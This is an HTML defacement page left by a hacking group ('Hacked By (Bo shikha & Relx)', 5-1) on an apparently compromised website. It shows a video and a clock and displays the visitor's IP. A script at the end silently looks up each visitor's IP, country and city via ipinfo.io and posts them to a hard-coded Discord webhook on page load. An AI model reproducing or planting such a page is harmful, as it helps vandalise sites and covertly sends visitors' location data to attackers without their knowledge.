<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="description" content="Hacked by 5-1">
  <meta http-equiv="cache-control" content="index,cache">
  <meta http-equiv="pragma" content="index,cache">
  <title>ҳ̸Ҳ̸ҳ 5-1 ҳ̸Ҳ̸ҳ</title>
  <style>
    html, body {
      height: 100%;
      margin: 0;
      overflow: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
      background-color: black; /*  */
      font-family: 'monospace';
      flex-direction: column; /*  */
    }
    .bg-video {
      width: 60%; /*  */
      height: auto; /*  */
      z-index: 1;
    }
    .content {
      color: white;
      text-align: center;
      z-index: 2;
      margin-top: 20px; /*  */
    }
    h1, p, font, marquee, #clock {
      text-shadow: 0 0 4px rgba(0, 0, 0, 0.8);
    }
    a:link {
      text-decoration: none;
    }
  </style>

  <script>
    function playSound() {
      var audio = document.querySelector("audio");
      audio.play();
    }

    async function fetchIP() {
      try {
        let response = await fetch('https://api.ipify.org?format=json');
        let data = await response.json();
        let ip = data.ip;
        document.getElementById('ip-address').innerHTML = 'IP: ' + ip;
      } catch (error) {
        console.error('Error fetching IP address:', error);
      }
    }

    document.addEventListener('DOMContentLoaded', fetchIP);
  </script>
</head>

<body onclick="playSound()" onmouseover="playSound()">
  <!--  -->
  <video class="bg-video" autoplay loop muted>
    <source src="https://cdn.discordapp.com/attachments/1294666102714007637/1294667751675396096/ssstwitter.com_17285430812931.mov?ex=670bd8cd&is=670a874d&hm=53483a7a6ee24217cdb22ec4ffa8fe2115d8b5e0bb421b33cd08a64dd45f5b20&" type="video/mp4">
    Your browser does not support the video tag.
  </video>

  <!--  -->
  <audio src="https://cdn.discordapp.com/attachments/1294666102714007637/1294667751675396096/ssstwitter.com_17285430812931.mov?ex=670bd8cd&is=670a874d&hm=53483a7a6ee24217cdb22ec4ffa8fe2115d8b5e0bb421b33cd08a64dd45f5b20&" loop></audio>

  <!--  -->
  <div class="content">
    <h1><font color="#f30404">Hacked By (Bo shikha & Relx)</font></h1>
    <p><font color="#c9cdd2ا</font></p>
    <a href="https://discord.gg/205" style="font-size: 30px; color: rgb(221, 4, 4);">Discord.gg/5-1</a>
    <div id="clock"></div>
    <div id="ip-address" style="color:#ff0000; margin-top: 5px;">...</div>
  </div>

  <script>
    // عرض الوقت
    function showTime() {
      var today = new Date();
      var hours = today.getHours();
      var minutes = today.getMinutes();
      var seconds = today.getSeconds();
      var period = hours < 12 ? 'AM' : 'PM';

      if (hours > 12) hours -= 12;
      if (hours === 0) hours = 12;
      minutes = minutes < 10 ? '0' + minutes : minutes;
      seconds = seconds < 10 ? '0' + seconds : seconds;

      document.getElementById('clock').innerHTML = hours + ":" + minutes + ":" + seconds + " " + period;
    }

    setInterval(showTime, 1000); // 

    //  IP 
    fetch('https://ipinfo.io/json')
      .then(response => response.json())
      .then(data => {
        const { ip, country, city } = data;
        const dateTime = new Date().toLocaleString();
        const webhookUrl = 'https://canary.discord.com/api/webhooks/1272243171002155171/1VplgHFEFQeh83OCY5rmFk7cKHzmj6LjPfBsCUXcPLPSr9jQFGrO3YeTgisQeDtMM1E8';
        fetch(webhookUrl, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({content: `IP: ${ip}\nCountry & City: ${country} - ${city}\nDate & Time: ${dateTime}`})
        });
      });
  </script>

</body>
</html>
